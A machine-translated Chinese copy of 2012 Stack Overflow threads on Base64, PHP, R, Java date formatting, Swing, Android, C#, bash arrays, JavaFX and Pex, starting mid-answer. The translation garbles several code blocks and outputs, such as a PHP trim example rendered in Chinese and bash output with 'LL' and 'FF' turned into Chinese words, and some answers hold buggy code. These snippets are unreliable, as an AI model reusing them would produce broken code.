String decoded = javax.xml.bind.DatatypeConverter.printBase64Binary(byteArrayBase64);
assert testString.equals(decoded); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-09-06T13:01:59.570

`Base64.decode()`似乎[返回一个`byte\[\]`](http://static.springsource.org/spring-security/site/docs/3.1.x/apidocs/org/springframework/security/crypto/codec/Base64.html). 调用`toString()`为您提供了数组的一些默认 Java 描述，不像“56AB0FC3...”。您需要自己进行转换。

同样，您的电话`getBytes()`根本不是您想的那样。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-09-06T13:14:50.883

[我从apache codec](http://commons.apache.org/codec/download_codec.cgi)尝试了 Base64 ，结果很好。

```
 import org.apache.commons.codec.binary.Base64;
    byte[] bytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9 };
    Base64 base64 = new Base64();
    byte[] stringToStore = base64.encode(bytes);
    System.out.print(Arrays.toString(stringToStore));//[65, 81, 73, 68, 66, 65, 85, 71, 66, 119, 103, 74]
    byte[] restoredBytes = base64.decode(stringToStore);
    System.out.print(Arrays.toString(restoredBytes));//[1, 2, 3, 4, 5, 6, 7, 8, 9] 
```

# php - 如何使用 apache 或 php 获取 forward_host 详细信息？

> ID：12300564
> 
> 赞同：1
> 
> 时间：2012-09-06T12:52:16.067
> 
> 标签：php, apache

如何从 PHP 获取 X-Forwarded-For？任何人都可以提供一些细节

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:52:58.677

它将在`$_SERVER`超全球

```
$_SERVER['X-Forwarded-For']; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:53:45.323

你可以试试这样的；

```
$headers = apache_request_headers(); 
$real_client_ip = $headers["X-Forwarded-For"]; 
```

那是你需要的东西吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T02:56:01.840

这是一个间接答案，但您可以调用`phpinfo()`以显示所有`$_SERVER`和`$_REQUEST`值。尝试调用它，并在显示的网页中搜索“X-Forwarded-For”。

如果该值在输出中，您将很容易找到它的保存位置。如果不是，那么浏览器很可能只是没有发送该标头。

# r - 从 R 中的 apply() 函数返回多个值

> ID：12300565
> 
> 赞同：13
> 
> 时间：2012-09-06T12:52:25.457
> 
> 标签：r, closures

我想从 apply() 函数返回多个值并将它们放在 R 中的单独列中，但我不断收到错误。我想做的是：

```
experiments$result1, experiments$result2, experiments$result3 <- apply(experiments, 1, 
function(row)
  #Some analysis here
  #return x, y, and z for column result1, result2, and result3
  x, y, z
) 
```

也许这是解决问题的错误方法。实验是一个包含多列数据的数据框。我想附加列，这些列是每一行的分析结果，但我不知道如何在没有循环的情况下做到这一点，这对于 R 来说不是惯用的。提前感谢您的帮助。

所以这里有一些更准确的代码。

```
experiments$result1, experiments$result2, experiments$result3 <- apply(experiments, 1, function(row)
  x <- row["startingTemp"]*2
  y <- row["startingTemp"]*3
  z <- row["startingTemp"]*4
  return (list(x, y, z))
) 
```

“startingTemp”字段是我的“实验”数据框中的列之一。我收到“闭包”类型不是子集且找不到对象“z”的错误。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-06T14:59:08.383

如果您要返回的三个值可以放入一个向量中（即它们不是某种复杂类型，如统计测试或拟合模型的结果），只需返回该向量`apply`并将其绑定到一个 3xN 矩阵。

```
experiments$result <- apply(experiments, 1, function(row){
  x <- row["startingTemp"]*2
  y <- row["startingTemp"]*3
  z <- row["startingTemp"]*4
  c(x, y, z)
})
experiments$result1 <- experiments$result[1,]
experiments$result2 <- experiments$result[2,]
experiments$result3 <- experiments$result[3,] 
```

如果您的三个返回值是复杂类型（或不是标量），则将它们作为列表返回（如 Alan 建议的那样）并使用`lapply`/提取它们`sapply`。

```
experiment$result1 <- lapply(experiment$result, "[[", 1) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-06T12:56:01.937

试试`return(list(x=x,y=y,z=z))`。对于每个实验，您返回一个包含 3 个值的列表。

*编辑*

该函数为每个实验返回一个列表。

```
results <- apply(exp,1,function(x) return(list(x=x,y=x*2,z=x*3))) #results is a list of lists`
experiment$res1 <- unlist(results)[attr(unlist(results),"names")=="x"]
experiment$res2 <- unlist(results)[attr(unlist(results),"names")=="y"]
experiment$res3 <- unlist(results)[attr(unlist(results),"names")=="z"] 
```

# php - 简单的寻呼机 php 上一个和下一个

> ID：12300568
> 
> 赞同：0
> 
> 时间：2012-09-06T12:52:32.707
> 
> 标签：php

我已经阅读了一堆工具并复制了一些代码，但代码是半英里！:) 我想知道是否不可能制作这样一个小页面（你会明白我的意思）我只是在一个带有上一个和下一个链接的小型寻呼机之后显示下一页结果......

```
<?php

//pagination

$pagelimit = 5

$result = mysql_query("SELECT * FROM blog ORDER BY id DESC LIMIT $pagelimit")
or die(mysql_error());

while($row = mysql_fetch_array( $result )) {

echo $row['title'];

}

echo "<a href='index.php?page=" . $row[$id - $pagelimit] . "'> Previous</a></li>";
echo "<a href='index.php?page=" . $row[$id + $pagelimit] . "'> Next</a></li>";

?> 
```

或类似的东西......有效！:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T13:00:54.283

这是一个合适的教程：[使用 PHP 进行分页](http://www.php-mysql-tutorial.com/wikis/php-tutorial/paging-using-php.aspx)

简而言之，您应该使用`$_GET['page']`在您的 mysql 查询中添加一个偏移量，它看起来像这样（您必须调整它以使其适合您的实现，但这是基本语法）

```
SELECT * FROM blog ORDER BY id DESC LIMIT $offset, $pagelimit 
```

# php - 使用php验证字符串中的空格

> ID：12300569
> 
> 赞同：-3
> 
> 时间：2012-09-06T12:52:33.147
> 
> 标签：php, string

验证在仅包含空格的文本框中输入的用户。

```
$str = ' ';
$str2 = " abc @ def <etc>"; 
```

我需要验证以上两个字符串，返回 $str 的输出为 false 且 $str2 为 true。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:54:15.893

我就是这样做的。

```
$isValidString = (bool) strlen(trim($str)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:54:29.657

我会使用修剪方法：

```
如果（修剪（$str）==“”）{
  // 空的
}
别的 {
  // 做 sg
}

```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T12:55:13.707

使用[修剪（）](http://php.net/manual/en/function.trim.php)。

> trim — 从字符串的开头和结尾去除空格（或其他字符）

```
if(trim($string) == "")
{
    return false;
}
return true; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-06T13:02:57.833

1) 对于空格，使用 str_replace：例如，$string = str_replace(' ', '', $string);

2）对于所有空白，使用preg_replace：

$string = preg_replace('/\s+/', '', $string);

3）如果您只是在字符串的开头或结尾处理多余的空格，您可以使用 trim()、ltrim() 或 rtrim() 来删除它。

# java - 如何在日期格式之间创建新行

> ID：12300571
> 
> 赞同：9
> 
> 时间：2012-09-06T12:52:46.663
> 
> 标签：java, android

我正在创建这样的日期格式：

```
SimpleDateFormat sdf =new SimpleDateFormat("MMM d, EEE, h:mm a"); 
```

我需要在日期、月份和时间之间换一条新线，就像这样

```
thus ,sep 6
4:25pm 
```

所以我做了以下更改：

```
SimpleDateFormat sdf =new SimpleDateFormat("MMM d, EEE,"+"\n"+" h:mm a"); 
```

它没有给我任何东西，只是在一行中创建了它，如下所示：

```
thus ,sep 6 4:25pm 
```

所以我采取了这样的格式对象

```
SimpleDateFormat sdf =new SimpleDateFormat("MMM d, EEE,");
SimpleDateFormat sdf1 =new SimpleDateFormat(" h:mm a"); 
```

并做到了：

```
sdf.format(calendar.getTime())+"\n"+sdf1.format(calendar.getTime()) 
```

但它再次给出了相同的结果

```
thus ,sep 6 4:25pm 
```

**日历**是一个日历对象。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-10-17T08:39:08.197

我从您的一条评论中看到您的原始解决方案确实有效，但是当我来到这里时，我遇到了同样的问题，所以让我为这个问题添加一个答案。（我的格式和你的有点不同。）

```
Date date = new Date(unixMilliseconds); 
SimpleDateFormat sdf = new SimpleDateFormat("MMM d, yyyy\nh:mma");
String formattedDate = sdf.format(date); 
```

`\n`in有效，`MMM d, yyyy\nh:mma`因为 the`\`和 the都不`n`是由`SimpleDateFormat`（[参见文档](http://developer.android.com/reference/java/text/SimpleDateFormat.html)）解释的，因此被传递给 Java String。如果它们确实有特殊含义，您可以使用单引号：（`MMM d, yyyy'\n'h:mma`也可以）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T14:38:20.613

我认为 Android 确实需要`\n`出现在字符串中，而不是实际的换行符。因此，您需要转义 Java 字符串中的反斜杠，如下所示：

```
String output = "Thus ,Sep 6" + "\\n" + "4:25pm"; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-06T12:55:19.183

不要使用\n，使用：

```
System.getProperty("line.separator"); 
```

获取行分隔符。

我找到了另一个来源，它告诉您可以使用`&#xA;`回车。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-06T12:56:10.070

如果要显示到 HTML 视图，则需要确保使用 HTML 换行符`<br/>`，而不是`\n`.

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-06T12:55:17.250

你确定，`\n`消失了吗？至少您的最后一次尝试与日期格式没有任何关系。您是否有机会为网页创建输出并且应该使用`<br />`instread of `\n`？

# java - joptionpane 和带有 yes no 按钮的确认对话框

> ID：12300573
> 
> 赞同：2
> 
> 时间：2012-09-06T12:52:52.057
> 
> 标签：java, swing, joptionpane

此代码正在运行。but the problem is when NO_OPTION is selected then the window is disposed. 我想在选择 NO_OPTION 时保留窗口？你能给点建议吗？

```
 int dialogButton = JOptionPane.YES_NO_OPTION;
            JOptionPane.showConfirmDialog (null, "First Row Will Selected As Default!! Do You Want To Close?","Warning",dialogButton);

            if(dialogButton == JOptionPane.YES_OPTION){ 

                int row = table.getSelectedRow();
                int col = table.getSelectedColumn();
                finalOID=(String)table.getModel().getValueAt(row, col);
                System.out.println("cancel clicked first oid:"+finalOID);
                dispose();

                } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T05:45:29.857

```
int dialogButton = JOptionPane.showConfirmDialog (null, "First Row Will Selected As Default!! Do You Want To Close?","Warning",JOptionPane.YES_NO_OPTION); 
```

这将满足要求

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-06T13:39:34.140

您可能需要[*如何制作对话框*](http://docs.oracle.com/javase/tutorial/uiswing/components/dialog.html)`JOptionPane.YES_NO_CANCEL_OPTION`中的说明。[](http://docs.oracle.com/javase/tutorial/uiswing/components/dialog.html)

# android - 为什么我在使用 ActionBar Sherlock 和旧版 android 版本时在 onCreate() 处收到错误？

> ID：12300581
> 
> 赞同：1
> 
> 时间：2012-09-06T12:53:20.353
> 
> 标签：android, exception, android-fragments, actionbarsherlock, logcat

# *** 更新：我不知道为什么，但删除一些未使用的导入显然修复了它。***

在较旧的 android 版本（例如 2.2）上启动我的应用程序时，我确实收到以下错误日志...

但我在较新的 Android 版本上没有任何错误。

```
"at my.package.MainActivity.onCreate(MainActivity.java:12)" 
```

是我的 activity_main.xml 被加载的地方，所以我认为我的有问题

```
<fragment> 
```

?

# 日志猫

```
09-06 14:18:47.037: E/AndroidRuntime(5887): FATAL EXCEPTION: main
09-06 14:18:47.037: E/AndroidRuntime(5887): java.lang.RuntimeException: Unable to start activity ComponentInfo{my.package/my.package.MainActivity}: java.lang.UnsupportedOperationException: Can't convert to dimension: type=0x2
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1768)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1784)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.app.ActivityThread.access$1500(ActivityThread.java:123)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:939)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.os.Handler.dispatchMessage(Handler.java:99)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.os.Looper.loop(Looper.java:130)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.app.ActivityThread.main(ActivityThread.java:3835)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at java.lang.reflect.Method.invokeNative(Native Method)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at java.lang.reflect.Method.invoke(Method.java:507)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:847)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:605)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at dalvik.system.NativeStart.main(Native Method)
09-06 14:18:47.037: E/AndroidRuntime(5887): Caused by: java.lang.UnsupportedOperationException: Can't convert to dimension: type=0x2
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.content.res.TypedArray.getDimensionPixelSize(TypedArray.java:463)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.view.ViewGroup$MarginLayoutParams.<init>(ViewGroup.java:3692)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.widget.LinearLayout$LayoutParams.<init>(LinearLayout.java:1400)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.widget.LinearLayout.generateLayoutParams(LinearLayout.java:1326)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.widget.LinearLayout.generateLayoutParams(LinearLayout.java:47)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.view.LayoutInflater.rInflate(LayoutInflater.java:625)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.view.LayoutInflater.inflate(LayoutInflater.java:408)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.view.LayoutInflater.inflate(LayoutInflater.java:320)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.view.LayoutInflater.inflate(LayoutInflater.java:276)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at com.actionbarsherlock.internal.ActionBarSherlockCompat.setContentView(ActionBarSherlockCompat.java:857)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at com.actionbarsherlock.app.SherlockFragmentActivity.setContentView(SherlockFragmentActivity.java:251)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at my.package.MainActivity.onCreate(MainActivity.java:12)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
09-06 14:18:47.037: E/AndroidRuntime(5887):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1722)
09-06 14:18:47.037: E/AndroidRuntime(5887):     ... 11 more 
```

# MainActivity.java

```
package my.package;

import android.os.Bundle;
import com.actionbarsherlock.app.SherlockFragmentActivity;

public class MainActivity extends SherlockFragmentActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
    }
} 
```

# activity_main.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<fragment
    android:id="@+id/mainFragment"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    class="my.package.MainFragment" />
</LinearLayout> 
```

# MainFragment.java

```
package my.package;

import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.content.Intent;
import com.actionbarsherlock.app.SherlockFragment;

public class MainFragment extends SherlockFragment {

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
    View view = inflater.inflate(R.layout.fragment_main, container, false);

    Button button = (Button) view.findViewById(R.id.bmibutton1);
    button.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View v) {
            updateDetail();
        }
    });

    return view;
}

// May also be triggered from the Activity
public void updateDetail() {
    BmiFragment fragment = (BmiFragment) getFragmentManager()
            .findFragmentById(R.id.bmiFragment);

    if (fragment != null && fragment.isInLayout()) {
    } else {
        Intent intent = new Intent(getActivity().getApplicationContext(),
                BmiActivity.class);

        startActivity(intent);
    }
}
} 
```

# fragment_main.xml

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent" >

<Button
    android:id="@+id/bmibutton1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_centerHorizontal="true"
    android:layout_centerVertical="true"
    android:text="BMI" />

<Button
    android:id="@+id/whtrbutton2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_alignRight="@+id/bmibutton1"
    android:layout_below="@+id/bmibutton1"
    android:text="WHtR" />

</RelativeLayout> 
```

# AndroidManifest.xml

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="my.package"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="7"
    android:targetSdkVersion="15" />

<application
    android:icon="@drawable/icon"
    android:label="@string/app_name"
    android:theme="@style/Theme.Sherlock.Light.DarkActionBar" >
    <activity android:name=".MainActivity" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity
        android:name=".BmiActivity"
        android:label="@string/title_activity_bmi" >
    </activity>
</application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T08:53:16.750

我不知道为什么，但删除一些未使用的导入显然修复了它。

# c# - 什么是 C# 等价于 Delphi 的 FormatFloat？

> ID：12300586
> 
> 赞同：0
> 
> 时间：2012-09-06T12:54:00.103
> 
> 标签：c#, delphi, formatting

我正在将一些 Delphi 代码移植到 C#。我找不到与 Delphi 类似的功能`FormatFloat`。

我在 Delphi 中有这行代码

```
str := FormatFloat('000', 1); 
```

分配给`str`字符串`'001'`。注意前导零。

如何在 C# 中实现相同的结果？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T12:56:11.397

您将[string.Format()](http://msdn.microsoft.com/en-us/library/system.string.format.aspx)与[自定义数字格式字符串](http://msdn.microsoft.com/en-us/library/0c899ak8.aspx)一起使用。例如：

```
int a = 1;
string.Format("{0:000}", a); // returns "001" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-06T12:57:45.373

您可以使用 ToString() 方法：

```
int number = 3;
string fmt = number.ToString("D3"); 
```

字符串变量 fmt 的值为“003”

# c# - 是否可以在服务器中使用谷歌分析？

> ID：12300587
> 
> 赞同：0
> 
> 时间：2012-09-06T12:54:01.650
> 
> 标签：c#, asp.net-mvc, c#-4.0, google-analytics, google-analytics-api

我有一个 URLShortener 应用程序，我想`Google Analytics`用于短 URL。但我使用`Response.Redirect()`方法，我不能使用谷歌分析的本地脚本。

我想知道是否有可能在服务器中有类似谷歌分析脚本的东西并运行它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:59:51.443

[Microsoft Silverlight Analytics Framework](http://msaf.codeplex.com/)也支持 Google Analytics。

我假设他们在 C# 代码中执行此操作，这*也应该*适用于在服务器端代码中使用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-13T17:34:56.297

是的，可以在服务器中使用谷歌分析。您需要有一个 Google Analytics（分析）帐户，[如此处所述](http://support.google.com/analytics/bin/answer.py?hl=en&answer=1009694)。

设置您的帐户后，他们将为您提供一个唯一的跟踪代码以及一个 JavaScript 代码，您必须将其放入您要跟踪的网站或母版页中。此 javascript 代码将为您发挥所有作用，您可以从您的 GA 帐户查看此信息。

您甚至可以通过 Google Analytics Easy Dashboard Javascript 库使用 Google 图表工具将此图表与您的网站集成（[更多信息在这里](http://analytics-api-samples.googlecode.com/svn/trunk/src/reporting/javascript/ez-ga-dash/docs/user-documentation.html)）。

从本教程中，您可以设置您的网站以将 GA 数据捕获到您的网站并通过 Google 图表显示在您自己的网页中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T13:03:30.493

当然，这在技术上是可行的。GA 所做的只是设置一些变量并向 GA 服务器发出 HTTP 请求，这可以通过 JS 或从服务器获取 gif 来完成。

主要问题是您不会获得很多您期望的数据，例如浏览器、位置、操作系统版本等，因为发出请求的客户端将是您自己的服务器。

最好将一些事件跟踪数据添加到重定向位置并使用 GA 事件跟踪进行跟踪，这样您可以获得更准确的数据集。

但是，如果您确实想继续沿着阻力最大的道路前进，那么这是一个很好的关于您将如何去做的文章。 [http://automateeverything.tumblr.com/post/20500736298/google-analytics-without-javascript-or-cookies](http://automateeverything.tumblr.com/post/20500736298/google-analytics-without-javascript-or-cookies) 这不是 C# 特定的，但您应该能够抽象它。

# php - 通过 php 使用打印机

> ID：12300589
> 
> 赞同：1
> 
> 时间：2012-09-06T12:54:08.887
> 
> 标签：php, windows, printing, localhost, intranet

我在 Intranet 中有四台计算机和一台打印机，我在其中一台 Windows 机器上安装了 WAMP。现在我想从窗口机器浏览器（或通过 Ajax 等）执行 PHP 脚本来打印数据。我需要知道这可能吗？如果是，那怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:57:49.007

使用[打印机](http://php.net/manual/en/ref.printer.php)功能：

```
<?php 
    $printer = "\\\\hostname\\printername"); 
    if($ph = printer_open($printer)) { 
       $fh = file_get_contents('myfile.txt');
       printer_set_option($ph, PRINTER_MODE, "RAW"); 
       printer_write($ph, $content); 
       printer_close($ph); 
    } else {
        echo "Can't connect to printer"; 
    }
?> 
```

# linux - 循环遍历带有空格的字符串数组

> ID：12300599
> 
> 赞同：10
> 
> 时间：2012-09-06T12:54:31.240
> 
> 标签：linux, arrays, bash, shell, for-loop

我正在尝试遍历包含其他数组的数组，这些数组由带空格的字符串组成。问题是我似乎无法保留字符串中的间距。如果我将 IFS 更改为 \n，则带有空格的字符串将被分成多个项目，或者如果我保持 IFS 不变，则数组的所有元素都被视为 1 个项目，这是一些示例代码：

```
#!/bin/sh
low1=("AA  QQ" "BB  LL")
low2=("CC" "DD")
low3=("EE" "FF")
high=(low1 low2 low3)

for high_item in ${high[@]}
do
   eval arrayz=\${$high_item[@]}
   #IFS=$'\n'
   for item in $arrayz
   do
      echo $item
   done
done 
```

输出：

```
AA
QQ
BB
二
抄送
DD
EE
法郎

```

如您所见，元素“AA QQ”和“BB LL”已被拆分。

如果我取消注释设置`IFS`为的行，`\n`我会得到以下信息：

```
AA QQ BB LL
抄送
东风

```

现在“AA QQ”和“BB LL”连在一起了！

无论如何我可以保留这些元素，就像它们原来的一样......我需要输出看起来像这样：

```
AAQQ
BB LL
抄送
DD
EE
法郎

```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T13:22:45.267

我认为您的意思是输出应如下所示：

```
AA  QQ
BB  LL
CC
DD
EE
FF 
```

IE：

```
${low1[0]}
${low1[1]}
${low2[0]}
${low2[1]}
${low3[0]}
${low3[1]} 
```

这可以通过以下方式完成：

```
#!/bin/bash

low1=("AA  QQ" "BB  LL")
low2=("CC" "DD")
low3=("EE" "FF")
high=(low1 low2 low3)

for high_item in ${high[@]}
do
    x="${high_item}[@]" # -> "low1[@]"
    arrays=( "${!x}" )

    #IFS=$'\n'
    for item in "${arrays[@]}"
    do
        echo "$item"
    done
done 
```

**请**始终使用`#!/bin/bash`bash 脚本。

解释：`${!x}`是间接变量扩展。它计算出名称包含在 中的变量的值`$x`。

对于我们的需要，`x`还需要有`[@]`数组扩展的后缀。特别注意它 is`x=${high_item}[@]`和**not** `x=${high_item[@]}`。

你*必须*在数组上下文中评估它；否则，它不会按预期工作（如果你这样做`arrays=${!x}`）。

啊，最后一点：`IFS`在这里没有任何区别。只要您正在处理带引号的数组，`IFS`就不会起作用。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-06T13:22:30.070

替换`eval`为间接参数扩展，你会得到我认为你想要的（尽管它与你当前给定的输出不匹配：

```
for high_item in "${high[@]}"
do
    arrayz="$high_item[@]"
    # arrayz is just a string like "low1[@]"
    for item in "${!arrayz}"
    do
        echo $item
    done
done 
```

请注意，需要在内部循环中引用数组扩展以保留`low1`.

# binding - JavaFX 2 绑定

> ID：12300602
> 
> 赞同：1
> 
> 时间：2012-09-06T12:54:46.373
> 
> 标签：binding, javafx-2

我在绑定`Label`textProperty 时遇到问题，我希望使用双变量对文本进行格式化。
如果我执行以下操作，它可以工作（标签文本属性已更新），但这样我就无法按照我的意愿格式化文本。

```
label.textProperty().bind(model.doubleProperty().asString()); 
```

这样不起作用（标签文本属性未更新）：

```
StringBinding labelBinding = new StringBinding() {

        {
            bind(model.doubleProperty().asString());
        }

        @Override
        protected String computeValue() {
            if(model.getDouble() <= 0) {
                return "---";
            } else {
                return df1.format(model.getDouble());
            }
        }
    };
    label.textProperty().bind(labelBinding); 
```

感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T07:53:12.333

我找到了如何让它工作，但我真的不明白它是如何工作的。

```
StringBinding labelBinding = new StringBinding() { 

    { 
        bind(model.doubleProperty()); // don't call asString() here
    } 

    @Override 
    protected String computeValue() { 
        if(model.getDouble() <= 0) { 
            return "---"; 
        } else { 
            return df1.format(model.getDouble()); 
        } 
    } 
}; 
label.textProperty().bind(labelBinding); 
```

但这会产生编译错误

```
label.textProperty().bind(model.doubleProperty()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-11T09:44:57.940

假设您有以下“JavaFX-Bean”：

```
import javafx.beans.property.DoubleProperty;
import javafx.beans.property.SimpleDoubleProperty;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.property.StringProperty;

public class Employee {
    private final StringProperty lastname = new SimpleStringProperty();
    private final StringProperty firstname = new SimpleStringProperty();
    private final DoubleProperty salary = new SimpleDoubleProperty();

    /**
     * @return the lastname Property
     */
    public StringProperty lastnameProperty() {
        return lastname;
    }

    /**
     * @return the lastname String
     */
    public String getLastname() {
        return lastname.get();
    }

    /**
     * @param lastname the lastname to set
     */
    public void setLastname(final String lastname) {
        this.lastname.set(lastname);
    }

    /**
     * @return the firstname property
     */
    public StringProperty firstnameProperty() {
        return firstname;
    }

    /**
     * @return the firstname String
     */
    public String getFirstname() {
        return firstname.get();
    }

    /**
     * @param firstname the firstname to set
     */
    public void setFirstname(final String firstname) {
        this.firstname.set(firstname);
    }

    /**
     * @return the salary Property
     */
    public DoubleProperty salaryProperty() {
        return salary;
    }

    /**
     * @return the salary double
     */
    public double getSalary() {
        return salary.get();
    }

    /**
     * @param salary the salary to set
     */
    public void setSalary(final double salary) {
        this.salary.set(salary);
    }

} 
```

现在在应用程序的启动方法中定义一个标签：

```
Label labaelSalary = new Label(); 
```

并将其与'JavaFX-Bean'的salaryProperty绑定：

```
labaelSalary.textProperty()
         .bind(emp.salaryProperty().asString("%.2f")); 
```

添加一个按钮并设置此按钮的操作：

```
Button changeSalaryButton = new Button("Change Salary"); 
changeSalaryButton.setOnAction(new EventHandler<ActionEvent>() {
   @Override
   public void handle(final ActionEvent event) {
      double salary = Math.random() * 10000;
      emp.setSalary(salary);
   }
}); 
```

每次点击 Button 时，Employee 对象 emp 的薪水是随机设置的。labelSalary 的有界文本（属性）立即更改为显示emp Employee 对象的salary 属性的新值。下面是启动方法的代码：

@覆盖

```
public void start(final Stage primaryStage) {

   Employee emp = new Employee();
   emp.setFirstname("Fred");
   emp.setLastname("Las Frite");
   emp.setSalary(12.500);

   Label labelSalary = new Label();
   labelSalary.textProperty()
      .bind(emp.salaryProperty().asString("%.2f"));
   Button changeSalaryButton = new Button("OK");
   changeSalaryButton.setOnAction(new EventHandler<ActionEvent>() {

      @Override
      public void handle(final ActionEvent event) {
         double salary = Math.random() * 10000;
         emp.setSalary(salary);
      }
   });

   HBox hBox = new HBox(10, labelSalary, changeSalaryButton);
   hBox.setPadding(new Insets(20));
   hBox.setAlignment(Pos.CENTER);
   primaryStage.setScene(new Scene(hBox));
   primaryStage.setWidth(400);
   primaryStage.setHeight(600);
   primaryStage.show();
} 
```

# c# - Pex（及其输出）是否适合企业环境？

> ID：12300604
> 
> 赞同：5
> 
> 时间：2012-09-06T12:54:57.750
> 
> 标签：c#, .net, unit-testing, pex

我喜欢 Pex 的想法 - 通过静态代码分析自动生成单元测试 - 但该工具实际生成的测试是可怕的、丑陋的、与 Pex 模块紧密耦合、难以阅读和理解等。

像这样的工具真的适合（在当前状态下）在企业环境中使用，重点必须放在易于维护上吗？

还是我误解了 Pex 的预期用途？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:00:31.600

确实，您误解了预期用途。

Pex 是一个白盒测试工具。它根据对它应该测试的代码的分析生成测试用例。这样做的原因是为了检测和测试*边缘情况*。所以基本上，你甚至不应该改变自动生成的测试。

您的正常单元测试不能被 Pex 替换。它只是一个额外的工具。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:05:41.923

这似乎是一个主观问题......

我会说是的，在给定框架/API 中编写的测试通常与该框架紧密耦合。Pex 的目的不是生成“可读”测试，而是确保代码覆盖给定的一组约束。如果这对您的产品有价值，那么它就是合适的——当然我敢打赌，对于给定的团队和给定的代码库，这将提供价值。

每个企业都是不同的，但产品及其代码决定了测试工具的适用性。我建议要质疑的是 Pex 对于给定代码库的价值，无论所讨论的组织如何。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T16:20:02.200

我曾在一家大型金融机构使用过 pex，并建议使用它，但仅限于非常具体的情况。我认为 pex 擅长它的工作（如此处其他地方所述，白盒测试以查找边缘情况），但测试的寿命并不长，因为它们的耦合非常紧密。

